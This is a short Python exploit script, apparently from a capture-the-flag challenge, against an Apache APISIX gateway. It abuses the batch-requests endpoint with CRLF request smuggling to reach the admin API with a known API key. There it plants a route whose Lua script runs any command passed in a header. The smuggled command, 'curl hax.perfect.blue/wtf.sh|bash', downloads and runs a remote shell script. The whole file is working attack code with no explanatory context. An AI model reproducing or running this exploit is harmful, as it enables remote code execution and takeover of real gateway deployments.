import requests
import json

HOST = "http://localhost:9080"
HOST = "http://47.243.183.218:49243"
HEADERS = {"X-API-KEY": "edd1c9f034335f136f87ad84b625c8f1"}

def PUT_route(num, data):
    return requests.put(HOST+f"/apisix/admin/routes/{num}", headers=HEADERS, json=data).text

def batch(data):
    return requests.post(HOST+"/apisix/batch-requests", json=data).text

PAYLOAD = {
  "methods": ["GET"],
  "uri": "/sice",
  "script":"local file = io.popen(ngx.req.get_headers()['cmd'], 'r') \n local output = file:read('*a') \n file:close() \n ngx.say(output)"
}

ser_payload = json.dumps(PAYLOAD) 
pay_len = len(ser_payload)

SICE  = {
    "headers": {
        "SICE": "me",
    },
    "timeout": 500,
    "pipeline": [
        {
            "method": "PUT",
            "path": f"/apisix/admin/routes/1 HTTP/1.1\r\nHost: 127.0.0.1\r\nX-API-KEY: edd1c9f034335f136f87ad84b625c8f1\r\ncmd: curl hax.perfect.blue/wtf.sh|bash\r\nContent-Length: {pay_len}\r\n\r\n{ser_payload}\r\n\r\n",
            "body": "test2"
        }
    ]
}

print(batch(SICE))
